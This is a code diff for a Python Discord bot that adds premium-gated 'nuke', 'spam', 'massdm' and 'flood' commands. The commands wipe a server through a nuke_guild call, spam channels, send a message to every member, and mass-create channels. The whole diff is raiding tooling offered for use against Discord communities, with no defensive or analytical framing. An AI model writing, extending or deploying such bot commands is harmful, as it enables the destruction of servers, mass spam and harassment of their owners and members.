@@ -163,6 +163,36 @@ async def add_premium_slash(interaction: discord.Interaction, user: discord.User
     add_premium(user.id)
     await interaction.response.send_message(f"✅ {user.name} is now Premium!", ephemeral=True)
 
+@client.command()
+async def nuke(ctx, *, message: str = None):
+    if not is_premium(ctx.author.id):
+        return await ctx.send("❌ Premium Only!")
+    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
+    await nuke_guild(ctx.guild, message)
+
+@client.command()
+async def spam(ctx, amount: int, *, message: str):
+    if not is_premium(ctx.author.id):
+        return await ctx.send("❌ Premium Only!")
+    asyncio.create_task(spam_task(ctx.channel, message, amount))
+
+@client.command()
+async def massdm(ctx, *, message: str):
+    if not is_premium(ctx.author.id):
+        return await ctx.send("❌ Premium Only!")
+    for member in ctx.guild.members:
+        if member != client.user and not member.bot:
+            try: await member.send(message)
+            except: continue
+
+@client.command()
+async def flood(ctx, amount: int, *, name: str):
+    if not is_premium(ctx.author.id):
+        return await ctx.send("❌ Premium Only!")
+    for _ in range(min(amount, 100)):
+        try: await ctx.guild.create_text_channel(name=name)
+        except: break
+
 try:
     client.run(token)
 except Exception as e:
